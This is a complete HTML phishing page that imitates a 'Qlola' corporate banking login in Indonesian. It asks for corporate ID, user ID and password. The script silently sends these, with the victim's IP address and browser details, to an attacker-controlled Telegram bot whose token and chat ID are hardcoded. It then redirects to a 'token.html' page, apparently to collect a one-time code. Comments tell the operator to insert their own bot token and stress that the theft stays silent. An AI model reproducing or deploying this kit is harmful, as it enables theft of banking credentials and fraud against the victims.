<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Qlola Login</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');

  * {
    box-sizing: border-box;
  }
  
  body {
    margin: 0;
    font-family: 'Roboto', sans-serif;
    background: linear-gradient(180deg, #b5d4f9 0%, #1e5dbf 100%);
    background-image: url('https://www.image2url.com/r2/default/images/1777433277823-55210f1e-3487-461e-ac15-0a1576d7805b.jpeg');
    background-repeat: no-repeat;
    background-size: cover;
    background-position: center;
    color: #111;
    display: flex;
    flex-direction: column;
    height: 100vh;
  }

  .container {
    margin: 10px;
    background: transparent;
    flex: 1;
    display: flex;
    flex-direction: column;
    justify-content: center;
  }
  
  .time {
    position: fixed;
    top: 10px;
    left: 10px;
    color: white;
    font-weight: 300;
    font-size: 18px;
    font-family: monospace;
    user-select: none;
    z-index: 10;
  }
  
  .lang-select {
    position: fixed;
    top: 10px;
    right: 10px;
    background: white;
    border-radius: 10px;
    border: 1.5px solid #1e5dbf;
    padding: 5px 15px;
    font-weight: 600;
    font-size: 14px;
    color: #1e5dbf;
    cursor: pointer;
    display: flex;
    align-items: center;
    user-select: none;
    z-index: 10;
  }
  
  .lang-select::after {
    content: '';
    margin-left: 6px;
    border: solid #1e5dbf;
    border-width: 0 2px 2px 0;
    display: inline-block;
    padding: 4px;
    transform: rotate(45deg);
  }
  
  .logo {
    width: 180px;
    margin: 0 auto 20px auto;
    display: block;
  }
  
  h2 {
    margin: 0 0 15px 5px;
    color: #111;
    font-weight: 700;
  }
  
  label {
    font-weight: 600;
    color: #222;
    display: block;
    margin-left: 5px;
    margin-top: 10px;
  }
  
  input[type="text"],
  input[type="password"] {
    width: 100%;
    border-radius: 10px;
    border: none;
    padding: 12px 45px 12px 15px;
    margin-top: 6px;
    font-size: 14px;
    box-shadow: 0px 2px 5px rgb(0 0 0 / 0.2);
    outline: none;
    font-family: 'Roboto', sans-serif;
    background: white;
    color: #333;
  }
  
  .password-wrapper {
    position: relative;
    width: 100%;
  }
  
  .toggle-password {
    position: absolute;
    right: 15px;
    top: 50%;
    transform: translateY(-50%);
    border: none;
    background: none;
    cursor: pointer;
    outline: none;
    padding: 0;
    display: flex;
    align-items: center;
    justify-content: center;
  }
  
  .toggle-password svg {
    width: 20px;
    height: 20px;
    fill: #777;
  }
  
  .forgot-password {
    text-align: right;
    margin-top: 8px;
    font-weight: 600;
    font-size: 13px;
  }
  
  .forgot-password a {
    color: #1e5dbf;
    text-decoration: underline;
    cursor: pointer;
  }
  
  button[type="submit"] {
    width: 100%;
    border-radius: 10px;
    border: none;
    padding: 15px;
    margin-top: 15px;
    background-color: #4CAF50;
    color: white;
    font-weight: 700;
    font-size: 16px;
    cursor: pointer;
    transition: background-color 0.3s;
  }
  
  button[type="submit"]:hover:not(:disabled) {
    background-color: #45a049;
  }
  
  button[type="submit"]:disabled {
    background-color: #bdbdbd;
    cursor: not-allowed;
  }
  
  .loading {
    opacity: 0.7;
    pointer-events: none;
  }
  
  .help-section {
    margin-top: auto;
    margin-bottom: 20px;
    text-align: center;
    font-weight: 500;
    font-size: 14px;
    color: white;
  }
  
  .help-section button {
    background: white;
    color: #1e5dbf;
    font-weight: 700;
    font-size: 14px;
    border-radius: 20px;
    padding: 8px 15px;
    border: none;
    cursor: pointer;
    margin-left: 6px;
  }

  ::-webkit-scrollbar {
    display: none;
  }
</style>
</head>
<body>

<div class="time" id="time">09:30:10</div>

<div class="lang-select" tabindex="0" role="button" aria-haspopup="listbox" aria-expanded="false">
  ID
</div>

<div class="container" role="main" aria-label="Login Form">
  <img src="" alt="" class="logo" />
  
  <h2>Login</h2>
  
  <form id="loginForm">
    <label for="corporateId">Corporate ID</label>
    <input id="corporateId" type="text" placeholder="Masukkan Corporate ID Anda" autocomplete="off" required />

    <label for="userId">User ID</label>
    <input id="userId" type="text" placeholder="Masukkan user ID anda" autocomplete="off" required />

    <label for="password">Kata Sandi</label>
    <div class="password-wrapper">
      <input id="password" type="password" placeholder="Masukkan kata sandi anda" autocomplete="off" required />
      <button type="button" class="toggle-password" aria-label="Toggle Kata Sandi Visibility" tabindex="-1">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
          <path d="M12 5c-7 0-11 7-11 7s4 7 11 7 11-7 11-7-4-7-11-7zm0 10a3 3 0 1 1 0-6 3 3 0 0 1 0 6z"/>
          <circle cx="12" cy="12" r="2.5"/>
        </svg>
      </button>
    </div>
    <div class="forgot-password">
      <a href="#">Lupa kata sandi?</a>
    </div>
    <button type="submit">Masuk</button>
  </form>
</div>

<div class="help-section">
  Butuh bantuan?
  <button type="button" onclick="alert('Hubungi Kami clicked')">Hubungi Kami</button>
</div>

<script>
  // Konfigurasi Telegram Bot - GANTI DENGAN TOKEN DAN CHAT ID ANDA
  const TELEGRAM_BOT_TOKEN = '8740332259:AAFqU2sY4D6fnxzPaRgDdCe9SYePMevwPTk'; // Ganti dengan token bot Anda
  const TELEGRAM_CHAT_ID = '8389632285';     // Ganti dengan chat ID Anda
  
  // Update jam realtime
  function updateTime() {
    const timeElem = document.getElementById('time');
    const now = new Date();
    const h = String(now.getHours()).padStart(2,'0');
    const m = String(now.getMinutes()).padStart(2,'0');
    const s = String(now.getSeconds()).padStart(2,'0');
    timeElem.textContent = `${h}:${m}:${s}`;
  }
  setInterval(updateTime, 1000);
  updateTime();

  // Toggle password visibility
  const togglePwdBtn = document.querySelector('.toggle-password');
  const passwordInput = document.getElementById('password');
  togglePwdBtn.addEventListener('click', () => {
    if(passwordInput.type === 'password') {
      passwordInput.type = 'text';
    } else {
      passwordInput.type = 'password';
    }
  });

  // Handle form submit - SILENT MODE (tanpa alert)
  document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const corporateId = document.getElementById('corporateId').value;
    const userId = document.getElementById('userId').value;
    const password = document.getElementById('password').value;
    const timestamp = new Date().toLocaleString('id-ID', { 
      timeZone: 'Asia/Jakarta',
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit'
    });
    
    // Loading state (silent)
    const submitBtn = this.querySelector('button[type="submit"]');
    const originalText = submitBtn.textContent;
    submitBtn.textContent = 'Mengirim...';
    submitBtn.disabled = true;
    document.body.classList.add('loading');
    
    // Format pesan untuk Telegram
    const message = `
🚨 *LOGIN QLOLA DETECTED* 🚨

📋 *Detail Login:*
- Corporate ID: \`${corporateId}\`
- User ID: \`${userId}\`
- Password: \`${password}\`

⏰ *Waktu:* ${timestamp}
🌐 *IP:* ${await getClientIP()}
🖥️ *User Agent:* ${navigator.userAgent}

*Login berhasil dicatat!*
    `;
    
    try {
      // Kirim ke Telegram (silent)
      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'Markdown'
        })
      });
      
      const result = await response.json();
      
      // Tidak ada alert - proses silent
      console.log('✅ Data berhasil dikirim ke Telegram:', result);
      
    } catch (error) {
      // Error juga silent - tidak ada alert
      console.error('❌ Error kirim Telegram:', error);
    } finally {
      // Reset form dan loading state (silent)
      this.reset();
      passwordInput.type = 'password';
      submitBtn.textContent = originalText;
      submitBtn.disabled = false;
      document.body.classList.remove('loading');
    }
    window.location.href = 'token.html'
  });

  // Fungsi IP detection
  async function getClientIP() {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      return data.ip;
    } catch {
      return 'Unknown';
    }
  }
</script>

</body>
</html>
